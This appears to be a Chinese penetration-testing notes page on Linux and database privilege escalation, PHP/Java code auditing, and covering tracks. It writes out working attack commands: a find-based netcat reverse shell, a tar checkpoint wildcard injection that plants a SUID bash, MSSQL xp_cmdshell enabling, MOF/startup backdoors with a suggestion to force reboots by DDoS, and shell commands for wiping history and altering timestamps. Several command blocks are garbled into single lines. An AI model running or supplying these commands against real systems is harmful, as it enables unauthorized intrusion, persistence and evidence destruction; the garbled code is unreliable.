更多参见资料《linux提权手法总结》，下载链接 https://www.jason-w.cn/wp-content/uploads/2021/06/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-linux%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93.pdf



#### 提权准备

采用LinEnum进行信息搜集，使用方法很简单，直接将程序放在要检测的linux系统上即可。这个程序可以搜集linux服务器基本信息已经是否可以进行suid等。项目地址 https://github.com/rebootuser/LinEnum 

**漏洞探测**

linux-exploit-suggester 2 项目地址https://github.com/jondonas/linux-exploit-suggester-2
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720134227689.png)

#### SUID配置错误漏洞

SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。这就像windows某些应用你给它赋予了系统执行权限，这个应用又是好攻击的。
**探测**

```bash
FindSUIDfind/ -perm -u=s -type f 2>/dev/nullFindGUIDfind/ -perm -g=s -type f 2>/dev/null
```

如果执行发现返回的目录包含以下关键词的说明存在suid配置错误漏洞
nmap vim less more nano cp mv find

**执行**
不同的模块有不同的执行命令，这里以find为例。更多模块利用方式参见 https://pentestlab.blog/2017/09/25/suid-executables/

```bash
touch test # 反弹find的高权限到find test exec netcat-lvp 5555-e /bin/sh \;
```


#### 压缩通配符

利用了压缩时会将checkpoint当做命令执行,定时任务有高权限

```bash
# 定时任务将要执行的文件cd /home/undead/script# 创建压缩文件tar czf /tmp/backup.tar.gz *# 将最终命令写入到echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/undead/script/test.shecho  "" > "--checkpoint-action=exec=sh test.sh"echo  "" > "--checkpoint=1
```

#### 定时任务执行权限分配过高

如图在定时任务中看到以下777权限的文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720191525289.png)
对高权限定时文件进行编辑写一些危险命令，如`chmod +s /tmp/bash`


### 数据库提权

在利用系统溢出漏洞无果的情况下，可以采用数据库提权，但需要知道数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码。除Access数据库外，其他数据库基本都是存在数据库提权的可能。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719134740292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
提权流程:服务探针-信息收集-提权利用-获取权限

#### Mysql

mysql安装之后是默认是集成系统最高权限，在获得root账号密码后，调用dll文件就可以获取系统权限了
更多mysql提权与利用参考https://www.sqlsec.com/2020/11/mysql.html

##### UDF

UDF (user defined function)，即用户自定义函数。


手工创建plugin目录或利用NTFS流创建

```bash
select 'x' into dumpfile '目录/lib/plugin : :INDEX_ALLOCATION';1.mysql<5.1（版本通过执行命令select version()看出）导出目录c :/ windows或system322.mysql=>5.1导出  安装目录（通过@@basedir可以得出）/ lib/plugin/（默认没有/ lib/plugin/）
```

##### MOF

提权成功率低，因为要上传到敏感目录，一般有waf什么的都会导致上传失败。简单来说利用mysql高权限，将mysql文件进行替换
导出自定义mof文件到系统目录加载
https://www.cnblogs.com/xishaonian/p/6384535.html
select load_file ('c:/phpstudy/PHPTutorial/www/user_add.mof') into outfile 'c:/windows/system32/wbem/mof/nullevt.mof' ;

##### 启动项知识点:(基于配合操作系统自启动)

导出自定义可执行文件到启动目录配合重启执行
将创建好的后门或执行文件进行服务器启动项写入，配合重启执行!
具体做法如下：
执行下图语句开启数据库外联，只有开启才能用MSF进行利用
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719145450430.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719145643586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


win10默认自启动文件夹在 C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719144928103.png)
这时候你只需要等待或主动让对方服务器重启，主动的话可以采用DDOS攻击等

##### 反弹知识点:(基于利用反弹特性命令执0行)

在web端执行
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719150329512.png)
在云服务器执行
nc -l -p 5577

#### Oracle提权演示

自动化工具：oracleshell,作者是冰蝎的作者
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719153918974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

普通用户模式:
前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。

DBA用户模式:(自动化工具演示)
拥有DBA账号密码,可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。

注入提升模式:(sqlmap测试演示)
拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显,需要自己验证。

（JSP网站不需要提权，自带system权限）

#### MssQL

以下方式提权有的命令是不会在数据库中进行回显值的。选其一执行

##### 使用xp_emdshell进行提权

xp_cmdshell默认在mssq12000中是开启的，在mssg12005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。
启用:
EXEC sp_configure 'show advanced options',1
RECONEIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
如图展示启动xp_cmdshell的过程
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719151756810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
开启之后就可以执行敏感操作了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719151920742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

****

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719152125480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### SQL sever 沙盒提权

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719153004358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### Redis

漏洞产生是因为自身配置导致的安全问题
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719155137106.png)

##### Redis数据库权限提升

redis服务因配置不当，可以被攻击者恶意利用。黑客借助Redis内置命令，可将现有数据恶意清空；如果Reids以root身份运行，黑客可往服务器上写入SSH公钥文件，直接登录服务连接（未授权或者有密码）
**利用如下方法提权**
利用计划任务执行命令反弹shell   nc监听。具体参考https://blog.csdn.net/fly_hps/article/details/80937837中（1）
		
**修复**
从修复可以看出其实这不属于漏洞只是一种配置不当导致的问题
【防外联】绑定需要访问数据库的ip。将127.0.0.1修改为需要访问此数据库的IP地址。
【防爆破】设置访问密码。在 Redis.conf中requirepass字段后，设置添加访问密码。
【即便连接上去权限也不高】修改Redis服务运行账号。以较低权限账号运行Redis服务，禁用账号的登录权限。

####  PostgreSQL

PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处"特性”，管理员或具有"cOPY To/FROM PROGRAM"权限的用户，可以使用这个特性执行任意命令。提权利用的是
洞:CVE-2019-9193 CVE-2018-1058
连接-利用漏洞-执行-提权
提权参考: https://vulhub.org/#/environments/postgres/
修复方案:升级版本或打上补丁

# 代码审计

代码审计是指你获得源代码后对代码进行下载交互操作并做源代码层面的分析，因此你在做审计前通常需要提前配置好相关环境。
代码审计的内容可能是审计框架也可能是审计混写也可能是程序员全程自己写的
是

## phpweb

中小型网站用得多

### 一键审计

以下工具都会存在误报，需自行验证
[海云安](https://www.secidea.com/)

* 免费试用
  [seay](https://github.com/f1tz/cnseay)
* 免费
* PHP代码审计
  系统可以帮助你建立快捷搜索，全局搜索关键词和函数，还可以帮助你一键测试可能存在的漏洞.文件下载链接


### 数据库监控

你可以用Seay系统自带的监控。但是通常不足够，有时候这个系统也抓不到，你可以再下一个mysql_moniter_client

### 常规代码审计

**搜索关键词**

利用seay搜索漏洞的相关关键词(程序关键词或注释)和接收用户交互的函数。
常见关键词

> **SQL注入**： select insert update mysql_query mysql、数据库等
>
> **文件上传**：$_FILES,type="file"，上传，move_upload_file()等
>
> **XSS跨站**： print print_r echo，sprintf die var_dump var_export等 
>
> **文件包含**： Include,include_once require， require_once等 
>
> **代码执行**： eval assert preg replace call user func call user，func array等 
>
> **命令执行**： system exec shell_exec `` passthru pcntl_exec popen， proc_open 
>
> **变量覆盖**： extract() parse_str() importrequestvariables() 、$$等
>
> **反序列化**： serialize() unserialize() _construct _destruct等 
> // 通用关键词可能会搜到很多文件包含此关键字，如果你不明确目标的情况下，通常优先看最敏感的目录如/admin
>
> **通用关键字**： $_GET $_POST $_REQUEST $_FILES $_SEVER

**追踪执行过程**
通过数据包（F12或burpsuie)中请求头、请求参数、URL等，利用seay搜索这些字符来追踪。追踪一般重点追踪验证函数和接收函数


**想深入理解？**
下个编译器追踪一下debug执行

通过应用及URL地址等分析可能存在xss及包含安全
抓包找到xSS无过滤代码块及文件包含有后缀需绕过代码块
unlink，delfile是php中对应删除的函数
删除数据库安装文件，可以重装数据库。

## JAVAWEB

主流

### 开发基础

JAVAEE主流框架就是常说的SSM,即Spring、Spring MVC、MyBatis。

#### Spring

##### 基础介绍

**安装**
[安装适应版本的dist包](https://repo.spring.io/ui/native/libs-release-local/org/springframework/spring/)
解压后重点是lib文件夹，在里面jar包分为3类：

 * 以RELEASE.jar结尾的是Spring框架class文件的压缩包。
   * 以RELEASE-javadoc.jar结尾的是Spring框架API文档的压缩包。

##### 核心知识点

在spring框架中创建对象有特定的方法（而非普通java的new）
bean
spring aop

spring数据库开发

spring事务管理

#### Spring MVC

SpringMVC数据绑定、JSON数据交互和RESTful支持、拦截器。

#### MyBatis

MyBatis的核心配置、动态SQL、MyBatis的关联映射和MyBatis与Spring的整合

### 开发基础

与php不同是里面有自带一些安全防御的写法比如预编译，代码层级显示不一样；一个javaweb程序可能有多个不同的框架组合而成，具体哪些框架得看开发者要开发什么业务。
以下展示了部分java框架
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718155255896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
与php审计不同，java审计的第一步通常是直接检测过滤器的漏洞，看看过滤器是不是会产生漏网之鱼。

### 基础开发知识

**组件**
 javaWeb中的重要三个组件Filter、servlet、Listening，其中所有的基础框架（spring、springmvc、struts2、mybatis、hibernate、spring boot）都是在这个基础上进行的，而其他功能框架（shiro、spring security、pio、quartz、activity等等）是在基础框架的基础上再使用的，而javaweb中的组件都是配置在web.xml中，其中在启动的顺序中是：
context-param——> listener——>filter——>servlet 

**命名规则**
com:
公司项目，copyright由项目发起的公司所有
包名为com.公司名.项目名.模块名.......
持久层: dao、persist、mapper
实体类: entity、model、bean、javabean、pojo
业务逻辑: service、biz
控制器:controller、servlet、action、web
过滤器:filter
异常:exception
监听器:listener
在不同的框架下一般包的命名规则不同，但大概如上，不同功能的Java文件放在不同的包中,根据Java文件的功能统一安放及命名。
jsp文件是普通的java程序，可以直接读取。jar需要进行反编译才能读取

**框架表达式**
struct 框架对应的表示是ognl
springboot 框架对应的表示是SPEL
这些表达式就像php中的eval能将字符串转换为代码去执行。如果java有框架且网页端有漏洞，通常都采用表达式在网页端进行触发

**框架**
框架版本、拦截器、执行流程是在试图挖0day漏洞需要认真考虑的



### 审计

##### 常见审计知识点

##### 寻找可控输入

request.getParameter("前端id名")	从前端获取GET/POST参数

等

##### 过滤敏感字符方案

在web.xml添加全局过滤器

对于全局过滤器过滤替代特殊关键词

#### SQL注入

java中常见写法

```bash
# 绝对存在漏洞，这种写法少见了Select * from test where id = '"+可控词+"'# 利用预编译接口能防御绝大部分漏洞，但是配置不当仍旧会存在漏洞    String sql = "SELECT * from corps where id = ? "; # ?用于占位，通常是预编译的标志，在程序执行顺序是先经过预编译处理后在将干净参数做拼接PreparedStatement pstt = conn.prepareStatement(sql);pstt.setObject(1, id);## 预编译有误String query = "SELECT * FROM usersWHERE userid ='"+ userid + "'" + " AND password='" +password + "'";PreparedStatement stmt =connection.prepareStatement(query);ResultSet rs = stmt.executeQuery();# 存储过程。使用CallableStatement对存储过程接口的实现来执行数据库查询，SQL代码定义并存储在数据库本身中，然后从应用程序中调用，使用存储过程和预编译在防SQLi方面的效果是相同的。String custname =request.getParameter("customerName");try { CallableStatement cs = connection.prepareCall("{callsp_getAccountBalance(?)}"); cs.setString(1, custname); ResultSet results = cs.executeQuery();     } catch (SQLException se) {          }# 属于输入验证的范畴，大多使用正则表达式限制，或对于诸如排序顺序之类的简单操作，最好将用户提供的输入转换为布尔值，然后将该布尔值用于选择要附加到查询的安全值。public String someMethod(boolean sortOrder) {String SQLquery = "someSQL ... order by Salary " + (sortOrder ? "ASC" :"DESC");`
```

**框架可能存在漏洞与防御**

Hibernate 框架中的 createQuery()函数等，如果使用不当，依旧可能造成 sql 注入。

****

Mybatis的#{}也是预处理方式处理SQL注入，虽然${}存在SQL注入的风险，但orderBy 、like、 in必须使用${}，因为#{}会多出单引号''导致SQL语句失效；

但是可以选择在java层做映射或过滤用户输入进行防御。

****

**预编译绕过**

参数orderExpression可以是一个selectExpression也可以是一个函数，比如使用一个case when语句，你可以把case when表达式理解成一个类似拼接的语句。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160336287.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160705489.png)



 **order by 绕过预编译**

类似下面sql语句 order by 后面是不能用预编译处理的只能通过拼接处理，只能手动进行过滤，详见案例。

```javascript
String sql = “Select * from news where title =?”+ “order by‘” + time + “’asc”
```

**%和_绕过预编译**

 预编译是不能处理%，需要手动过滤，否则会造成慢查询和DOS。

 **SQLi检测绕过**

  若SQL在处理过程中经过黑/白名单（正则）或Filter检测，通常检测代码存在缺陷则可进行检测绕过。

##### 防御

1) 

#### 手动

**查看过滤器（Filter）**
定义了过滤器传入的数据都会经过过滤
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718160648321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

查看过滤配置信息/src/main/webapp/WEB_INF/web.xml
过滤器通常有多个通常包含与漏洞有关和无关的，你只需要留意与漏洞有关的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718161029543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
三方过滤器和开发员自己写的一般从命名就可以分辨出，分辨出后有利于你快速定位到过滤器的包。过滤器的的实现一个Filter只需要重写init . doFilter 、destroy方法即可，其中过滤逻辑都在doFilter方法中实现。下图展示了一个过滤器的写法
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718161616824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**查看拦截器（interceptor）**
拦截包与过滤包功能是一样的，但区别在于拦截包没有web.xml,网站是采用框架开发的。那么你在看配置文件时就应该对应框架默认配置文件去寻找，另外拦截包的写法也会与web.xml的略有不同，更多情况如果你遇见了请百度。以下给出了常见的xml过滤器命名
struts2配置文件:struts. xml
spring配置文件:applicationcontext. xml
spring MvC 配置文件:spring-mvc.xml
Hibernate配置文件:Hibernate.cfg- xml
Mybaits配置文件:mybatis-config . xml

如果同时拥有过滤器和拦截器是先filter后interceptor。
**查看涉及的第三方包**
看引用的jar包或pom. xml
如下图是看引用的外部包
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718151923925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



#### 工具


一键代码审计：Fortify、海云安

反编译（将无法直接阅读的.class字节码文件）：

IDE：Jetbrains IDEA

**全局搜索**
ctrl+shift+F 全局搜索，通常搜索出关键词有可能匹配过多，可以导入新窗口看得更清晰
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718153132565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**引用追踪**
快捷键，ALT+F7 通常能查找出引用，但如果你查找的函数是被放在了jar就找不到了。需要在IDE中先对jar 添加为库才可以看到里面的代码，在载入到项目中才可以搜索到

# 待补充：物理攻击

## wifi

## ID卡

# 待补充：隐藏技术

阻止防御者信息搜集，销毁行程记录，隐藏存留文件。


## 实用工具

该项目旨在以 Pythonic 的方式轻松地与 Microsoft Graph 和 Office 365 进行交互。访问电子邮件、日历、联系人、OneDrive 等。很容易以一种对初学者来说简单而直接的方式进行，对经验丰富的 Python 程序员来说感觉恰到好处。一旦我们攻击进了 Windows 系统，我们就可以在受害者机器上使用 PowerShell 进行 Responder 攻击。工具如下https://github.com/lgandx/Responder



###  日志删除

攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征
即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录
留存的后门包含攻击者的信息
使用的代理或跳板可能会被反向入侵
**windows**
操作日志：3389登录列表、文件访问日志、浏览器日志、系统事件
登录日志：系统安全日志
**linux**
清除历史
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;
kill -9 $$ kill history
history -c
删除 ~/.ssh/known_hosts 中记录
修改文件时间戳
touch –r
删除tmp目录临时文件
